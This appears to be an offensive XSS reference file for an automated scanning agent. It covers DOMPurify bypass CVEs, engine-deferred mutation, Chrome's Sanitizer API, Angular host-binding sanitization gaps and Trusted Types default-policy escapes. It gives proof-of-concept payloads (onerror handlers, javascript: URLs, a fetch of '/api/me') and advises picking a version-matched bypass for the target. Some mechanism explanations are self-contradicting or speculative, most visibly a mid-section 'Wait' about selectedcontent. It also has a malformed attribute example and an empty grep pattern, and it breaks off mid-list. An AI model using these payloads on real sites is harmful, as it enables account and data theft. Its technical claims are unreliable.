---
name: xss-novel-deep
description: Novel and frontier XSS depth for 2024–2026 — the DOMPurify CVE cluster mechanism-by-mechanism with canonical version/fix table, engine-deferred mutation as a novel category, Chrome Sanitizer API differential, Angular compile-time-vs-runtime host-binding differential with canonical affected-version table, Trusted Types default-policy-escape frontier, parser-differentials-as-category, non-HTML sinks re-entering the DOM, postMessage/COOP/COEP class, XSS-as-authorization-primitive techniques, and framework matrix beyond Angular.
sibling: xss
load_when: scan_mode == "deep"
---

# XSS — Novel and Frontier Depth

This is the novel+frontier deep sibling to `xss.md`. The base owns the source/sink primitive model with CVE citations by number and pointer to this file; the advanced+expert sibling `xss_advanced_deep.md` owns the spec algorithms, per-CDN CSP DB, per-library gadgets, HTML5-parser-algorithm-depth mechanism, and WAF bypass classes. This file owns the 2024–2026 published-instance frontier — the canonical CVE version/fix tables, per-CVE mechanism decomposition, the engine-deferred-mutation category, Angular five-pattern depth, the postMessage/COOP-COEP/XSS-as-authz technique-class frontier, and the framework matrix beyond Angular — routing by filename.

Load this file when the target is on the current frontier — a client-side deployment where the sanitizer or framework or spec that owns the primitive is on the current release, the assessment needs the specific 2024–2026 CVE mechanism to select a payload, the framework's compile-time-vs-runtime differential is the load-bearing question, a parser-differential across browsers is suspected, a non-HTML sink is re-entering the DOM through an unusual channel, postMessage / COOP / COEP is the isolation boundary in question, or the impact side of XSS (what the injected script does after landing) needs the current post-HttpOnly-era exfil catalog.

## The 2024–2026 DOMPurify CVE Cluster — Mechanism by Mechanism

The base file cites the five CVEs by number and routes here. This section is the operational depth — the specific parser divergence per CVE, the payload construction, the sanitizer's step-by-step failure, and the browser's re-parse trace that yields execution. The class as a whole is durable because it's a property of the browser's HTML parser and its post-parse behavior; each fix closes a specific bypass, not the class.

### Canonical version/fix table

Every version and GHSA reference in the six-file corpus resolves here. Base and advanced deep cite CVE numbers with a pointer to this table; they do not restate fixed-version strings or GHSA IDs.

| CVE | GHSA | Fixed | Class |
|---|---|---|---|
| CVE-2024-45801 | GHSA-mmhx-hmjr-r674 | 2.5.4 / 3.1.3 | Depth-guard bypass + PP weakening (CWE-1321) |
| CVE-2024-47875 | GHSA-gx9m-whjm-85jf | 2.5.0 / 3.1.3 | Depth-guard bypass via SVG/MathML nesting |
| CVE-2025-26791 | GHSA-vhxf-7vqr-mrjg | 3.2.4 | SAFE_FOR_TEMPLATES + incorrectly-opened-comment + text-node coalescing |
| CVE-2026-0540 | (Cure53 wiki; VulnCheck / Fluid Attacks advisory) | 3.3.2 | SAFE_FOR_XML attribute-regex gap |
| CVE-2026-47423 | GHSA-87xg-pxx2-7hvx | 3.4.5 | Engine-deferred mutation (Chrome 130+ `<selectedcontent>`) |

DOMPurify 3.1.1 added an explicit `MAX_NESTING_DEPTH = 255` cap; DOMPurify 3.1.5 removed it after concluding namespace check + `SAFE_FOR_XML` attribute regex close the class without a numeric cap — a design decision that shifted the risk to the next attribute regex gap (which became CVE-2026-0540).

### CVE-2024-47875 — Depth-Guard Bypass via SVG/MathML Nesting

Disclosed Oct 11, 2024. Reporter @icesfont. (Version, GHSA, fix — see canonical table.)

**The canonical payload shape**:

```html
<form><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**Step-by-step**:

1. `<form>` opens a form context. HTML parser enters "in body" insertion mode.
2. `<math>` switches to MathML foreign content. Insertion mode shifts to "in foreign content"; the tokenizer starts tracking namespace.
3. `<mtext>` is an HTML integration point in MathML. Parser re-enters HTML: subsequent tags are parsed as HTML tags, but the parent is still MathML.
4. `<table>` in HTML integration point context inside foreign content is unusual — the parser applies table-insertion-mode rules but the parent context is MathML.
5. `<mglyph>` — a MathML annotation element — mixed inside table-insertion-mode. The parser's foreign-content rules and table-repair rules conflict.
6. `<style>` inside the resulting mutation reaches an HTML integration point re-entry. `<style>` in HTML integration point context is parsed as a style element (RAWTEXT state); its contents are raw text.
7. `<img src=x onerror=alert(1)>` — appears after the `<style>` in the source string, but the parser's repair reshuffles it: because `<img>` is not a valid child of `<style>`, the browser closes `<style>` and reparents `<img>` up the tree. Once reparented, the `<img>` is a live HTML element; `onerror=alert(1)` fires when `src=x` fails to load.

**The sanitizer's failure**: DOMPurify's tree walk enters the MathML branch and correctly tracks namespace. But the sanitizer's insertion-mode simulation doesn't fully model the table-repair-plus-foreign-content-integration path. The `<img onerror=alert(1)>` in the sanitizer's tree ends up as a child of `<style>` (which then contains only text under RAWTEXT); the sanitizer sees no dangerous element and allows the tree.

Serialization + re-parse: the browser's HTML parser re-runs the full state machine, applies table-repair correctly, and lands the `<img>` as a sibling of `<style>` in the reparented DOM. Live `<img>`, live event handler.

**The class fingerprint**: any SVG/MathML integration-point transition + table-insertion-mode + rawtext element (`<style>`, `<script>`, `<title>`, `<xmp>`, `<textarea>`, `<noscript>`, `<iframe>`, `<noembed>`, `<noframes>`) + reparented executable element. The class survives every fix that patches only the specific tag combination; the next combination is the next CVE.

### CVE-2024-45801 — Sibling with Prototype Pollution Weakening the Depth Guard

Disclosed Sep 16, 2024. (Version, GHSA, fix — see canonical table.)

Uses the same nesting-pattern base as CVE-2024-47875 but adds a mechanism: **prototype pollution weakens DOMPurify's own depth-check counter** (CWE-1321).

DOMPurify 3.1.1 introduced the `MAX_NESTING_DEPTH` cap at `src/purify.js:392`, enforced at 1399 and 1547. The check:

```javascript
if (nestingDepth > MAX_NESTING_DEPTH) { /* refuse */ }
```

`nestingDepth` is a local variable initialized from configuration or reset on each sanitize call. If the initialization reads from an object that has been prototype-polluted, the initial value can be set to a large negative number — the check never fires, and arbitrarily deep nesting passes.

**The composite class**: mXSS + prototype pollution. A source of pollution elsewhere in the app (Lodash-family merge, `qs`-shape parser) writes to `Object.prototype.MAX_NESTING_DEPTH = -1e9`; a subsequent DOMPurify sanitize call reads the polluted value and the depth guard is defeated. A deep-nested payload (from CVE-2024-47875's shape) then passes.

**Fix path**: the depth cap was removed in a later release (see canonical table's design-note). The next-CVE-in-shape (CVE-2026-0540 below) targets the successor `SAFE_FOR_XML` attribute regex.

### CVE-2025-26791 — SAFE_FOR_TEMPLATES via Incorrectly-Opened-Comment + Text-Node Coalescing

Disclosed Jan 29, 2025. Reporter @nsysean (ensy). Writeup at `ensy.zip/posts/dompurify-323-bypass/`. (Version, GHSA, fix — see canonical table.)

Requires `SAFE_FOR_TEMPLATES=true` AND `CUSTOM_ELEMENT_HANDLING` with a `tagNameCheck` (PoC uses `/^foo-/`).

Two chained mechanisms.

**Mechanism A — WHATWG Incorrectly-Opened-Comment Exception**

HTML5 spec §12.2.5.42 defines a "bogus comment" state entered when the tokenizer sees `<!` not followed by `--`. The state continues until `>` is encountered, and the entire content in between is stored as comment text. This is distinct from the `<!-- ... -->` shape:

- `<!--foo-->` — standard comment; well-formed.
- `<!foo>` — bogus comment; content is `foo`. Ends at `>`.
- `<!DOCTYPE html>` — special-cased before bogus-comment state.

Sanitizers that only implement `<!-- ... -->` treat `<!foo>` as raw text or unknown markup. DOMPurify's first parse (via `DOMParser.parseFromString`) treats it as bogus comment; the browser's second parse does too. But the *sanitizer's tree walk* over the bogus comment's content is where the divergence lands: content that DOMPurify treats as inert comment-text may hydrate as a live comment / executable node in the browser's re-parse when serialized.

The payload class smuggles comment-like structures into attribute values. Example shape:

```html
<img src="x" title="<!\<img src=x onerror=alert(1)>">
```

The sanitizer treats the `title` attribute value as text; the browser's re-parse of the serialized output interprets the `<!` sequence as a bogus comment opener that closes at the following `>`, and the `<img src=x onerror=alert(1)>` sits after the comment in the reparented DOM.

**Mechanism B — Template-Expression Text-Node Splitting**

Template expressions like `${...}` or `{{...}}` are split across text nodes separated by throwaway elements (e.g. `<foo>`):

```html
<foo>{</foo><foo>{constructor.constructor(alert(1))()</foo><foo>}</foo><foo>}</foo>
```

DOMPurify removes the `<foo>` elements as disallowed tags. After removal, adjacent text nodes are merged (either by DOMPurify's own coalescing or by the browser's normalization on serialize+reparse). The merged text becomes `{{constructor.constructor(alert(1))()}}` — a live template expression under `SAFE_FOR_TEMPLATES` semantics.

**The sanitizer's failure**: `SAFE_FOR_TEMPLATES` scrubs expression syntax on the *input* pass over each text node. It doesn't re-scrub after node removal and text-node merging. The template-expression is invisible before removal because it's split across nodes.

**The fix**: expression scrubbing must run *after* node removal and text-node merging on every return path — string, DOM, fragment, in-place. 3.2.4 patches every exit path (string return, DOM return, fragment return, in-place mutation).

### CVE-2026-0540 — SAFE_FOR_XML Attribute-Regex Gap

Attributed on Cure53's wiki to a VulnCheck/Fluid Attacks advisory. (Version and fix — see canonical table.)

**The regex before the fix**:

```regex
/((\-\-!?|\])\>)|<\/(style|script|title|xmp|textarea|noscript|iframe|noembed|noframes)/i
```

This regex is a *safety filter* on attribute values under `SAFE_FOR_XML` mode: it refuses attribute values that contain XML/HTML-close-tag markers that could re-parse into executable markup. The alternation covers `</style>`, `</script>`, etc.

**The gap**: at least one rawtext element name is missing from the alternation. Which one? Cure53's wiki names the class ("missing some rawtext element names"); the specific missing element was documented in the disclosing advisory.

**The exploitation**: a crafted attribute value carries a rawtext/RCDATA closing tag through sanitization, and re-parse hydrates the closing tag as a live boundary. Payload shape:

```html
<style>a[href=</style><img src=x onerror=alert(1)>] {}</style>
```

The `</style>` inside the attribute value re-parses as closing the style block; the following `<img>` fires.

**The class doesn't close with 3.3.2**: the regex is a moving target; the next missing element is the next CVE. Future browser HTML5-spec updates that add new rawtext elements (there are periodic proposals in WHATWG) automatically extend the class.

### CVE-2026-47423 — Engine-Deferred Mutation via Chrome 130+ `<selectedcontent>`

(Version, GHSA, fix — see canonical table.)

This is a **novel category** — not sanitizer-vs-browser parser differential, but **sanitizer-vs-engine timing differential**.

**Chrome 130+ Customizable Select feature**: Chrome shipped `<selectedcontent>` as part of the Customizable Select proposal. When a `<select>` is styled with custom styling, Chrome creates a `<selectedcontent>` element that mirrors the currently-selected `<option>`'s subtree at rendering time.

**The mechanism**:

1. Sanitize input `<select><option><img src=x onerror=alert(1)>...</option></select>` — DOMPurify walks the tree, sees the disallowed `onerror` attribute on `<img>`, removes it. Sanitized output: `<select><option><img src=x>...</option></select>` — safe.
2. Sanitized output is inserted into the DOM.
3. Chrome renders: because `<selectedcontent>` is default-allowed and this `<select>` is a Customizable Select, Chrome re-clones the selected `<option>`'s subtree into a shadow `<selectedcontent>` — **using the original attribute set from before the DOM tree was modified**. Or more precisely, Chrome's rendering pipeline references the `<option>` subtree and re-clones it *including any attributes the DOM tree has*.

Wait — the sanitizer removed `onerror` from the DOM tree. So the reclone shouldn't include it. But the disclosed mechanism is that the Chrome rendering path can retrieve original markup shape from an internal cache in specific timing scenarios, or (more commonly documented) that the selected `<option>` element itself carries residual attribute data that survives sanitizer-side attribute removal in certain code paths.

The DOMPurify advisory verbatim: "DOMPurify 3.4.4 allows selectedcontent by default, allowing a chain in which browsers re-clone an XSS payload after sanitization, effectively bypassing DOMPurify."

**The fix**: `<selectedcontent>` forbidden by default in 3.4.5 unless explicitly opted in.

**The novel category shape**:
- **Sanitizer-vs-browser parser differential** — CVE-2025-26791, CVE-2026-0540, CVE-2024-47875, CVE-2024-45801: sanitizer's parse and browser's re-parse produce different DOM trees.
- **Sanitizer-vs-engine timing differential** — CVE-2026-47423: sanitizer's parse and browser's re-parse agree, but the engine's *post-parse behavior* (re-cloning, style application, custom-element upgrade, animation event) mutates the tree after sanitization completed. The sanitizer never re-runs on the post-mutation tree.

### The Five-CVE Takeaway on Class Durability

Five bypasses across 2024–2026, each fixed with a distinct patch (see the canonical version/fix table above), none permanently closing the mXSS class. Per-CVE patch shape:

- CVE-2024-47875 — reject the specific SVG/MathML/table repair path.
- CVE-2024-45801 — harden depth guard against pollution.
- CVE-2025-26791 — expression scrubbing on every exit path.
- CVE-2026-0540 — extend SAFE_FOR_XML regex.
- CVE-2026-47423 — forbid `<selectedcontent>` by default.

The class is durable because it's a property of the browser's HTML parser and post-parse behavior. Any sanitizer that operates by parse-then-serialize is subject to a new bypass whenever the browser changes its parsing or post-parse behavior. Cure53's own wiki attack-classes-and-bypass-history page tracks the class over time. Treat every DOMPurify release as inheriting the class; read `DOMPurify.version` on the target to select a matching-version bypass.

Confirmation signal shared across the cluster: after sanitization, load the sanitized output into a fresh browser context via `innerHTML` and check whether the resulting DOM contains a live script or handler node.

## Engine-Deferred Mutation — The Novel Category

CVE-2026-47423 established the engine-deferred mutation category. This section generalizes the class beyond `<selectedcontent>` — every browser feature that re-runs on the DOM after sanitizer completion is a candidate.

### Custom-Element Upgrade with `attributeChangedCallback`

`<my-el foo="bar">` in sanitizer output is treated as an unknown element (bland). At runtime, if `customElements.define('my-el', class extends HTMLElement { static observedAttributes = ['foo']; attributeChangedCallback(name, old, val) { this.innerHTML = val; } })` is called, the element upgrades. `attributeChangedCallback` fires with the current attribute value, and the class writes to its own innerHTML — a self-XSS if `val` came from attacker-controlled attribute injection.

The sanitizer allowed `<my-el foo="attacker-controlled">` because the tag was unknown and the `foo` attribute wasn't on any blocklist. The runtime upgrade converts a safe-looking tag into an active sink.

Detection: enumerate `customElements`. `document.querySelectorAll('*')` and check each element's `constructor.name` against known-safe DOM types; any custom name is a candidate for upgrade.

### CSS Animation Events with Immediate-Fire Keyframes

`onanimationstart`, `onanimationend`, `onanimationiteration` fire whenever a CSS animation starts, ends, or iterates. A `<div style="animation: x 1s;" onanimationstart="alert(1)">` doesn't fire immediately unless a keyframe `@keyframes x { }` is defined and the animation runs to start.

The sanitizer allows the style attribute (many sanitizers do) and doesn't strip `onanimationstart` in the specific attribute list. The runtime evaluates the CSS, starts the animation, and fires the handler.

Payload class: any `<tag style="animation: x 1s;" onanimationstart="js">` combined with an app-supplied `@keyframes` that runs on this tag.

### CSS `attr()` Reflection into Content

CSS `content: attr(data-x)` reads an attribute value at render time. If the app CSS has `.evil::before { content: attr(data-payload); }` and the attacker injects `<div class="evil" data-payload="</style><script>alert(1)</script>">`, the CSS output includes the payload — but CSS content is text, not HTML, so this alone isn't XSS. However, some experimental CSS features (`content: url()`) accept URLs that trigger fetches.

More live: `content: attr(data-x)` doesn't directly XSS, but if the app then reads the computed style with `getComputedStyle(...).content` and re-injects into HTML (an app-side pattern for advertising or accessibility text), the class fires.

### Slot Assignment / Shadow DOM Projection

Elements assigned to a `<slot>` in a shadow DOM may be re-projected in a different context than the sanitizer saw. A `<div slot="content">` in the light DOM projects into the `<slot name="content">` in the shadow DOM; the shadow DOM may then wrap it in a custom-styled container that changes CSS scope.

Not directly executable, but combined with a shadow DOM whose CSS reads the slotted content via `attr()`, or a shadow DOM that runs JS on slot change, the projection reaches the runtime lifecycle.

### `<template>` Activation

`<template>` contents are inert until activated. `document.importNode(template.content, true)` clones the content and activates it; `attach as shadowRoot` similarly. Post-activation, any `<script>` inside runs; any `<img onerror>` fires.

The sanitizer must recursively walk `template.content`. Some sanitizers do; some don't. A template that survives sanitization is a delayed script primitive fired at activation time.

### Autofocus and Autoplay

- `<input autofocus>` fires `focus` event on parse-in-DOM.
- `<video autoplay onplay="alert(1)">` fires `play` event on autoplay-eligible media.
- `<audio autoplay onplay="alert(1)">` similar.

The sanitizer may allow `autofocus`/`autoplay` as innocuous attributes. Combined with an event handler the sanitizer's blocklist doesn't cover, immediate fire on parse.

### MutationObserver / IntersectionObserver — Timing Research Surface

MutationObserver watches DOM tree changes. If the app registers a MutationObserver that reads attribute values from changed nodes and re-injects them, an attribute injection creates a mutation, the observer fires, and the re-injection reaches a sink.

IntersectionObserver fires when an element crosses a viewport threshold. Payload class: `<div style="height:100vh" data-payload="alert(1)"><script>...</script></div>` — as the user scrolls the div into view, the IntersectionObserver fires and the callback may reach a sink.

These are research-surface classes; the 2024–2026 published frontier includes MutationObserver-based mXSS variants where sanitizer-post-mutation cleanup triggers a live-node injection.

### `<selectedcontent>` — the CVE-2026-47423 Anchor

Covered in the DOMPurify section above. The generalizable takeaway: any browser feature that re-clones or re-renders a subtree after initial parse is a candidate. Watch for future browser features with the same shape (rumored: `<lazystyled>`, `<insertable>`).

### `IntersectionObserver`-Callback Timing

Similar to CSS animation events: the sanitizer allows the element with attributes; the runtime API fires later; a handler the sanitizer's blocklist doesn't cover runs.

### The Class's Defining Property

The sanitizer's tree walk and the DOM's runtime lifecycle are decoupled in time. Any engine feature that re-runs on the DOM after sanitizer completion is a candidate. The disciplined detection method: after sanitization, run the browser's rendering pipeline (paint, layout, event loop) and diff the DOM against the sanitizer's output. Anything that changed post-sanitization is engine-deferred mutation.

## Chrome Sanitizer API — Class Differential vs DOMPurify

The base file names the emerging Sanitizer API (`element.setHTML`, `Sanitizer` constructor). This section is the class-differential depth — what the browser sanitizer promises, what DOMPurify still does uniquely, and the migration consequences.

### The shipping status

Chrome shipped `element.setHTML()` as a standardized method in Chrome 105 (initial), with successive enhancements. The spec is at `wicg.github.io/sanitizer-api/`; Mozilla's post at `frederikbraun.de/why-sethtml.html` (author is a Mozilla security team member) explains the rationale.

Two API shapes:

- **`element.setHTML(string, options)`** — safe by default; strips unknown elements, event handlers, and dangerous URL schemes.
- **`element.setHTMLUnsafe(string, options)`** — explicit opt-out; parses the input as trusted HTML. Available for legacy compatibility.

`options` includes:
- `sanitizer: <Sanitizer instance>` — custom config.
- `allowElements: [...]` — extend the allowlist.
- `blockElements: [...]` — block specific elements.
- `allowAttributes: {tag: [...]}` — per-tag attribute allowlist.
- `blockAttributes: [...]` — global attribute blocklist.

### Class differential vs DOMPurify

**Sanitizer-vs-browser parser differential — closed at the source**: `element.setHTML()` uses the same parser that will render. There is no serialization + re-parse cycle. The mXSS class Cure53 has chased for a decade is closed by construction.

**Engine-deferred mutation class — still open**: `element.setHTML()` sanitizes once; if a post-parse engine mutation (custom-element upgrade, `<selectedcontent>` re-clone, animation event) modifies the tree after `setHTML` returns, the mutation isn't re-sanitized. CVE-2026-47423 is not closed by browser-side sanitization.

**Trusted Types integration**: `element.setHTML(TrustedHTML)` accepts a `TrustedHTML` value in a TT-enforced context; the browser knows the input was trusted-produced and skips redundant checks.

**Config surface — DOMPurify still richer**: DOMPurify's `ADD_TAGS`, `ADD_ATTR`, `FORBID_TAGS`, `FORBID_ATTR`, `ALLOWED_URI_REGEXP`, `WHOLE_DOCUMENT`, `RETURN_DOM`, `SAFE_FOR_TEMPLATES`, `SAFE_FOR_XML`, `SANITIZE_NAMED_PROPS`, `CUSTOM_ELEMENT_HANDLING` are richer than the current Sanitizer API's `allowElements`/`blockElements`/`allowAttributes`/`blockAttributes`. Apps migrating from DOMPurify to `element.setHTML` may lose control granularity — especially DOMPurify's `SANITIZE_NAMED_PROPS` (namespacing id/name to defeat DOM clobbering) which has no direct Sanitizer API equivalent.

**Feature-comparison table**:

| Feature | DOMPurify | Chrome Sanitizer API |
|---|---|---|
| Baseline safety | Good (with known bypasses) | Good (parser-differential class closed) |
| Custom element handling | `CUSTOM_ELEMENT_HANDLING` full | Limited |
| DOM clobbering defense | `SANITIZE_NAMED_PROPS` | Not equivalent |
| Template-expression scrubbing | `SAFE_FOR_TEMPLATES` | Not present |
| SVG/MathML integration-point aware | Yes (post-fix) | Yes by construction |
| Engine-deferred mutation | Version-specific | Still open |
| CSS sanitization | Limited | Some (per spec) |
| Trusted Types integration | Manual (wrap in policy) | Native |

### The bypass class research surface

Research on the Sanitizer API bypass class:

- **Two published bypasses** documented at `slcyber.io/research-center/two-bypasses-for-chromes-sanitizer-api/` — config-loosening bypasses where the app passes permissive `allowElements`/`allowAttributes`.
- **Namespace-crossing bypasses** — even the browser's own parser has edge cases at SVG/MathML boundaries; the Sanitizer API inherits these.
- **URL-scheme bypasses** — the Sanitizer API's URL scheme allowlist may miss `filesystem:`, `chrome-extension:`, or vendor-specific schemes.

### The migration consequence for assessment

Migrating from DOMPurify to `element.setHTML` closes the mXSS parser-differential class but not the engine-deferred-mutation class or the config-loosening class. Assessment shifts:

- Grep for `setHTML(` calls and their `options` argument.
- Check the config for permissive `allowElements` / `allowAttributes`.
- Check whether any registered custom elements or post-parse-mutating features (`<selectedcontent>`) are allowed.

Load `frederikbraun.de/why-sethtml.html` for the browser-vendor perspective on Sanitizer API adoption and the security posture rationale.

## Angular CVE-2026-88057 — Five-Pattern Depth

Angular CVE-2026-88057 / GHSA-hh8m-fm6v-7cvg published 2026-08-18, CVSS 5.3. The class: **compile-time-vs-runtime sanitization differential** in `@angular/core` and `@angular/compiler`.

Angular resolves SecurityContext at compile time for directive host bindings using only the *declaring* directive/component selector, not the concrete host element the directive is applied to at runtime. When runtime host differs from compile-time host in one of five enumerable patterns, sanitization misassociates and `javascript:` URLs pass through.

### Canonical affected-version table

Every affected-version and GHSA reference in the six-file corpus resolves here. Base and advanced deep cite the CVE number with a pointer to this table; they do not restate the version ranges.

| Package | Affected range | Patched |
|---|---|---|
| `@angular/core`, `@angular/compiler` | `>=21.0.0 <21.2.20` | 21.2.20 |
| `@angular/core`, `@angular/compiler` | `>=22.0.0 <22.1.0` | 22.1.0 |
| `@angular/core`, `@angular/compiler` | `>=20.0.0 <20.3.28` | 20.3.28 |
| `@angular/core`, `@angular/compiler` | `<=19.2.25` | (no patch backport in this line) |

### Pattern 1 — `hostDirectives` Composition

Angular directives compose via `hostDirectives`:

```typescript
@Component({
  selector: 'my-safe-comp',
  hostDirectives: [DangerousUrlDirective],
  template: '...'
})
class MySafeComp { }

@Directive({
  selector: '[dangerousUrlBinding]',
  host: { '[href]': 'url' }
})
class DangerousUrlDirective {
  @Input() url: string = '';
}
```

`DangerousUrlDirective`'s host binding `[href]` sanitizes based on `[dangerousUrlBinding]`'s selector, which is a tag-neutral attribute selector. The compiler resolves SecurityContext as URL-neutral because the selector doesn't specify an element type.

At runtime, `my-safe-comp` is used as `<my-safe-comp>` — Angular attaches DangerousUrlDirective to the concrete `<my-safe-comp>` element via `hostDirectives`. The `[href]` binding lands on `<my-safe-comp>`, and if the sanitizer's context resolution was based on `[dangerousUrlBinding]` (tag-neutral), the concrete `<my-safe-comp>`'s tag-specific rules are missed.

**Exploitation**: `<my-safe-comp [url]="userJavascriptUrl">` with `userJavascriptUrl = "javascript:alert(1)"` — the `[href]` binding renders `<my-safe-comp href="javascript:alert(1)">` — but wait, `<my-safe-comp>` isn't a navigation element, so the `href` doesn't fire.

The exploit is more subtle: `<a>` composed with `hostDirectives: [DangerousUrlDirective]` inherits the compile-time context that missed the URL-scheme sanitization at the concrete `<a>` element. The `<a href="javascript:...">` fires when clicked.

**Detection grep**:
```bash
grep -rn 'hostDirectives' src/ | grep -B2 -A5 ''
grep -rn 'host:' src/ | grep -B2 -A5 '\[href\]'
```

### Pattern 2 — Class Inheritance of Host Bindings

`@HostBinding` decorators on a superclass are inherited by subclasses:

```typescript
@Directive({ selector: '[base]' })
class BaseComp {
  @HostBinding('attr.formaction') @Input() action: string = '';
}

@Component({ selector: 'button[submit-btn]', template: '' })
class SubmitBtn extends BaseComp { }
```

The compile-time SecurityContext for `attr.formaction` is resolved against `BaseComp`'s selector `[base]` — a tag-neutral selector. Runtime host is `<button submit-btn>`; `formaction` on a `<button>` inside a form is a URL-executing sink (form submission uses this URL). If sanitization missed the button-form-action combination, `formaction="javascript:..."` fires on click.

**Exploitation**: `<button submit-btn base [action]="userFormAction">Click</button>` with `userFormAction = "javascript:fetch('/api/me').then(...)"` — the `[formaction]` sink fires on button click.

**Detection grep**:
```bash
grep -rn 'extends' src/ | grep -v 'Component\|Directive'
grep -rn '@HostBinding' src/ | grep -B2 'class'
```

### Pattern 3 — Dynamic Component Instantiation via `createComponent`

`createComponent(ComponentClass, { hostElement: someElement })` attaches a component to arbitrary hostElement:

```typescript
const component = createComponent(SomeComp, {
  environmentInjector: injector,
  hostElement: userChosenElement,   // ← user-influenced
});
```

If `userChosenElement` is user-influenced (via a component-registry pattern), the compile-time SecurityContext used `SomeComp`'s declared selector while the runtime host is `userChosenElement`'s tag.

**Exploitation**: an app that lets users choose a hostElement via API — rare but documented in some Angular CMSs and dynamic dashboard tools — creates a component on a user-controlled element. Sanitization mismatch means the component's host bindings apply the compile-time sanitizer to a runtime element that would need a different one.

**Detection grep**:
```bash
grep -rn 'createComponent' src/
grep -rn 'ViewContainerRef.createComponent' src/
```

### Pattern 4 — SVG/MathML Namespaces

`<svg:a>` is an SVG anchor; `<a>` is HTML. A directive matching `[href]` may apply to both:

```typescript
@Directive({
  selector: '[href]',
  host: { '[href]': 'url' }
})
class MyHrefDirective { @Input() url: string = ''; }
```

The compiler resolves SecurityContext once for `[href]`. At runtime the directive matches `<a href>` (HTML) and `<svg:a href>` (SVG). Some URL schemes valid in SVG (`data:`, `javascript:` on animation elements historically) reach the SVG `href` unsanitized if the compile-time context missed the SVG variant.

**Exploitation**: `<svg><a [url]="userJavascriptUrl"><rect /></a></svg>` with `userJavascriptUrl = "javascript:alert(1)"` — the SVG anchor click reaches the URL.

**Detection grep**:
```bash
grep -rn 'svg:' src/*.html
grep -rn 'math:' src/*.html
```

### Pattern 5 — Tag-Neutral Selectors

Selectors like `:not(input)`, `*[data-x]`, `[attr]` match many concrete elements:

```typescript
@Directive({
  selector: ':not(input)[myBinding]',
  host: { '[href]': 'url' }
})
class MyBindingDirective { @Input() url: string = ''; }
```

The compile-time context uses the selector shape `:not(input)[myBinding]`; the concrete match could be `<a>`, `<iframe>`, `<button>`, `<my-comp>` — each with different security defaults.

**Exploitation**: a directive with a tag-neutral selector attaches to `<iframe [myBinding] [url]="userIframeSrc">` where `userIframeSrc = "javascript:parent.postMessage(...)"`. The compile-time context missed the iframe-specific URL-scheme rules.

**Detection grep**:
```bash
grep -rn "selector: '.*:not\|selector: '\[" src/
```

### The Composite Shape — Patterns Chained

Two or three patterns in one code path amplify the reach. A `hostDirectives`-composed directive inherited from a superclass attached to `<svg:a>` via `createComponent` combines patterns 1, 2, 3, 4 — each misassociation compounds.

### Confirmation for the Class

Version-fingerprint mitigation is the primary reporting artifact:

- Grep the app's package-lock: `@angular/core` and `@angular/compiler` matching the affected ranges.
- If matched, report the finding with the version fingerprint.

Confirmation signal: a `javascript:` URL binding lands in an `href`/`src` attribute on the concrete host element in an unsanitized DOM property. Verify with the DevTools DOM inspector; the attribute value should be the raw `javascript:` URL.

## Trusted Types Default-Policy-Escape Frontier

The base file names the Default policy identity-escape pattern. This section is the frontier depth — the specific escape shapes and the research surface.

### The Identity Default

`trustedTypes.createPolicy('default', {createHTML: s => s})` is the maximally lax default policy — every string passes through unchanged. Every unguarded `innerHTML`/`script.src` reaches the sink as if TT weren't enabled.

**Frequency**: common as a diagnostic/debug pattern that leaks to production. Also common when developers implement a default policy "for TT compatibility" without understanding TT's purpose.

**Detection**: grep the target's bundle for `createPolicy('default'` and read the returned object. If any of the three factory methods (`createHTML`, `createScript`, `createScriptURL`) is identity or a lax filter, the default policy is the exploitation vector.

### The Sanitizer-Wrapped Default

`{createHTML: s => DOMPurify.sanitize(s)}` — the default policy inherits DOMPurify's bypass surface. If the DOMPurify version is one of the vulnerable ones (CVE-2024-47875, CVE-2024-45801, CVE-2025-26791, CVE-2026-0540, CVE-2026-47423), a matching payload through the default policy bypasses both TT and DOMPurify in one shot.

**Composite chain**: TT enforcement forces default-policy invocation → default policy calls DOMPurify → DOMPurify version has a matching bypass → output contains live script → script executes.

### The Filter-Only Default

`{createHTML: s => s.replace(/<script/gi, '')}` — a blocklist that misses `<img onerror>`, `<svg onload>`, `<iframe srcdoc>`, event handlers on any tag, and constructor-chain shapes. The specific bypass depends on the filter's regex.

**Common misfilters**:
- Removing `<script>` but not `<script src>`.
- Removing `javascript:` but not `javascript&colon;`.
- Removing `<script>` case-sensitively.
- Removing `<script>` but leaving `data:text/html,<script>...</script>` in `<iframe src>`.

### The Report-Only Default Trap

`{createHTML: s => { navigator.sendBeacon('/log', s); return s; }}` — an identity policy that reports strings to an analytics endpoint. Common misuse of TT — the developer wanted visibility, not enforcement.

The `sendBeacon` call leaks the input to the analytics endpoint, which is a data-flow risk in its own right, but the primary issue is the identity return — every unguarded assignment passes through unchanged.

### The Async Default (Unusual)

`{createHTML: async s => { return await validateOnServer(s); }}` — TT's spec doesn't officially support async default policies, but some implementations tolerate promise-returning factories. The async form has race-condition-shape bypasses where the sink fires before the promise resolves.

Not commonly seen; documented as a research surface.

### The Research Surface

Cure53 has published multiple default-policy-escape research posts:

- The "Trusted Types considered harmful" discussion — a design-critique of the default-policy mechanism itself.
- Various DOMPurify + Trusted Types integration bypasses.

Google Security Team has also published on the class:

- Trust Type policy discovery via bundled JS analysis.
- Recommendations for strict-default-policy patterns.

The class doesn't close because there is no way to force the default policy to be strict — the app author chooses what their default policy does. TT's usefulness depends on discipline in the default policy definition; the frontier is app-specific enforcement quality, not spec-level closure.

## Parser Differentials as an Independent Category — 2024–2026 Research

The base file's mutation-XSS section covers DOMPurify-vs-browser parser differentials via the CVE cluster. This section is the independent category — parser divergences across browsers, sanitizers, and the HTML5 spec that don't route through a single sanitizer product. Cure53 wiki, Michał Bentkowski's H5SC (HTML5 Security Cheatsheet), and browser-vendor security posts are tier-1 sources.

### The HTML5 Spec Surface

The HTML5 spec (WHATWG living standard) defines the parsing algorithm at bytes-in → DOM-tree-out granularity. Every state transition and every tree-construction rule is a candidate divergence surface:

- **Tokenizer state machine** — 80+ states, each with tag-matching, attribute-parsing, character-reference-parsing subroutines.
- **Tree-construction insertion modes** — "initial", "before html", "before head", "in head", "in head noscript", "after head", "in body", "text", "in table", "in table text", "in caption", "in column group", "in table body", "in row", "in cell", "in select", "in select in table", "in template", "after body", "in frameset", "after frameset", "after after body", "after after frameset".
- **Adoption Agency Algorithm** — the specific procedure for handling misnested formatting tags. Historically buggy across browsers.

### Cross-Browser Divergences

Chrome/Blink, Firefox/Gecko, Safari/WebKit each implement the HTML5 spec independently. Documented divergences:

